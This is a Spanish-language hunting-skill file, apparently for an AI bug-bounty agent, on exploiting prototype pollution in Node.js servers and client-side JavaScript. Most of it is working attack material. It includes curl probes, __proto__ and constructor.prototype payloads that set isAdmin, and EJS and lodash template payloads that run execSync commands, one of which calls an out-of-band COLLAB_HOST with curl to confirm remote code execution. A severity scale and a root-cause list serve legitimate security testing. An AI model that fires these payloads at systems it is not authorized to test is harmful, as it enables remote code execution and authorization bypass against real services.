---
name: prototype-pollution
description: Hunting skill para Prototype Pollution — server-side (Node.js/lodash → RCE via child_process/EJS/Pug) y client-side (DOM XSS via sink). Usar cuando el target corre Node.js/Express/Fastify/NestJS y tiene endpoints que mergean JSON input en objetos, o cuando hay JS client-side que hace deep merge de query params.
sources: elementalsouls/Claude-BugHunter (hunt-nodejs), npm-packages knowledge base, hackerone_public
---

## Qué es esto y qué NO es

Prototype Pollution = el atacante inyecta propiedades en `Object.prototype` via `__proto__` o `constructor.prototype` a través de un merge/assign/clone inseguro. En server-side puede llevar a RCE si la propiedad poluta llega a un sink peligroso (`child_process`, template engine). En client-side puede llevar a DOM XSS.

**Server-side PP → RCE** es Critical. **Client-side PP → XSS** depende del sink. **PP sin sink** = Medium/Low.

---

## Conocimiento previo

Use the `hexbrain` skill for relevant public prior art when it can change the test plan; verify any lead against primary sources and target evidence.

---

## Gate de Confirmación

**Para PP server-side:**
- La clave poluta aparece en responses de requests subsiguientes sin haberla enviado, O
- OOB callback recibido (RCE confirmado), O
- Output de `id` / `whoami` en response

**Para PP client-side:**
- La propiedad poluta llega a un sink DOM (`innerHTML`, `eval`, `document.write`) y ejecuta JS

PP confirmado sin sink alcanzable = documentar como Medium y buscar sink.

---

## Señales de superficie de ataque

**Stack signals:**
```
X-Powered-By: Express
Node.js en error messages / stack traces
package.json expuesto
__proto__ aceptado en JSON body sin error
```

**Endpoints de alto riesgo:**
```
/api/merge    /api/update    /api/settings
/api/clone    /api/extend    /api/assign
```

**Librerías vulnerables a buscar en package.json:**
```
lodash < 4.17.21    (merge, defaultsDeep, set, zipObjectDeep)
jquery < 3.4.0      ($.extend deep)
hoek < 6.1.3        (clone)
mixin-deep < 1.3.2
set-value < 2.0.1
merge < 1.2.1
deep-extend < 0.6.0
```

---

## Metodología

### Paso 1 — Fingerprint Node.js
```bash
curl -sI https://target/ | grep -i "x-powered-by\|nodejs\|express"
curl -s "https://target/package.json"
curl -s "https://target/package-lock.json"
```

### Paso 2 — Detectar PP via `__proto__`

**JSON body:**
```bash
curl -s -X POST https://target/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'
```

**Via `constructor.prototype`:**
```bash
curl -s -X POST https://target/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'
```

**Via query string (librería `qs`):**
```bash
curl -s "https://target/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://target/api/data?constructor[prototype][admin]=1"
```

### Paso 3 — Confirmar que la polución persistió
```bash
curl -s "https://target/api/me" | grep -i "polluted\|isAdmin\|admin"
```

Si la clave aparece en responses subsiguientes sin haberla enviado → PP confirmado, buscar sink.

### Paso 4 — Escalación a RCE (si hay PP confirmado)

**Sink 1: `child_process` via options.shell pollution**
```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/fd/0"
  }
}
```

**Sink 2: lodash template pollution (CVE-2021-23337)**
```json
{
  "__proto__": {
    "sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"
  }
}
```

**Sink 3: EJS `outputFunctionName` (si el target usa EJS)**
```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"
  }
}
```

**Confirmar con OOB:**
```json
{
  "__proto__": {
    "outputFunctionName": "x;require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce-confirm\");x"
  }
}
```

### Paso 5 — Client-side PP (si es un SPA)

Buscá en JS bundles propiedades que se lean de `Object.prototype` y lleguen a sinks DOM:
```javascript
// Sinks peligrosos a buscar
innerHTML  document.write  eval  setTimeout(string)
$.html()   src  href  location
```

Inyectá via query string y observá si la propiedad poluta llega al sink.

---

## Sinks de alto yield por framework/librería

| Librería | Sink de PP → RCE |
|---|---|
| lodash `_.template` | `sourceURL` pollution → RCE |
| lodash `_.defaultsDeep` | `shell` pollution → child_process |
| EJS (`ejs.render`) | `outputFunctionName` pollution → RCE |
| Pug (`pug.render`) | `pretty` / `filters` pollution |
| Handlebars < 4.7.7 | `helpers` / `blockHelperMissing` |
| `child_process.exec(cmd, opts)` | `opts.shell` pollution |
| `vm.runInNewContext` | prototype chain reach |

---

## Root causes comunes

1. `Object.assign({}, userInput)` / `lodash.merge({}, userInput)` sin sanitizar claves `__proto__`/`constructor`
2. Librerías de merge/clone desactualizadas
3. `qs.parse()` sin `allowPrototypes: false`
4. Frameworks que hacen deep merge de query params en options de template engine

---

## Chains y skills relacionadas

- **`npm-packages`** — Si PP viene de una librería, revisá la versión exacta contra CVEs; la librería puede tener PP confirmado sin necesidad de buscar el sink manualmente
- **`deserialization-ssti`** — PP que llega a un template engine (EJS/Pug/Handlebars) = SSTI efectiva → RCE. Son chains frecuentes
- **`xss-dom`** — PP client-side con sink en `innerHTML`/`eval` = DOM XSS. El payload llega via URL y no aparece en ningún parámetro visible
- **`business-logic`** — PP que poluta `isAdmin: true` o `role: "admin"` puede bypassear checks de autorización sin llegar a RCE
